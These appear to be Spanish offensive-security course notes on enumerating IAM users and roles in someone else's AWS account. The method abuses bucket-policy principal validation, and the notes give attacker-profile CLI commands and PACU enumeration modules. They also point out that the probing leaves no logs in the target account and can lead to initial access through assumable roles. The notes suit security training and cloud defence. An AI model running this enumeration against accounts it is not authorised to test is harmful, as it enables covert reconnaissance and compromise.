# Técnica de Enumeración de Usuarios IAM en Cuentas AWS Objetivo

## Requisitos previos:
- Una cuenta AWS propia para realizar la enumeración
- Conocer el ID de cuenta AWS del objetivo (obtenido con la técnica anterior)

## Pasos:

1. **Crear un bucket S3 en tu cuenta de atacante**
   - Ejecutar `aws --profile attacker s3 mb s3://[nombre-bucket-único]`
   - Por ejemplo: `aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM`

2. **Crear una política de bucket con un usuario IAM objetivo**
   - Crear un archivo JSON (grant-s3-bucket-read.json) que:
     - Defina un permiso `s3:ListBucket`
     - Especifique en `Principal` un ARN de usuario de la cuenta objetivo
     - Ejemplo: `"Principal": {"AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]}`

3. **Aplicar la política al bucket**
   - Ejecutar `aws --profile attacker s3api put-bucket-policy --bucket [nombre-bucket] --policy file://grant-s3-bucket-read.json`
   - Si no hay error, el usuario especificado existe en la cuenta objetivo
   - Si hay error `MalformedPolicy: Invalid principal in policy`, el usuario no existe

4. **Probar diferentes nombres de usuario o roles**
   - Crear variantes de la política con diferentes nombres de usuarios/roles a probar
   - Para enumerar de forma sistemática, crear un archivo con una lista de nombres probables
   - Ejemplo: `echo -n "admin\nsecurity_auditor\ncontent_creator..." > /tmp/role-names.txt`

5. **Automatizar el proceso con herramientas como PACU**
   - Instalar PACU: `sudo apt install pacu`
   - Iniciar PACU: `pacu`
   - Importar credenciales: `import_keys [perfil-atacante]`
   - Para enumerar roles: `run iam__enum_roles --word-list /tmp/role-names.txt --account-id [ID-cuenta-objetivo]`
   - Para enumerar usuarios: `run iam__enum_users` con parámetros similares

## Observaciones importantes:
- Esta técnica aprovecha que AWS valida la existencia de una identidad al aplicar políticas
- Funciona no solo con políticas de bucket S3 sino también con roles (política de confianza AssumeRole)
- Las actividades quedan registradas en la cuenta del atacante, no en la cuenta objetivo
- En algunos casos, además de enumerar identidades, se puede detectar si los roles son asumibles
- Si un rol es asumible, puede proporcionar acceso directo a la cuenta objetivo (compromiso inicial)

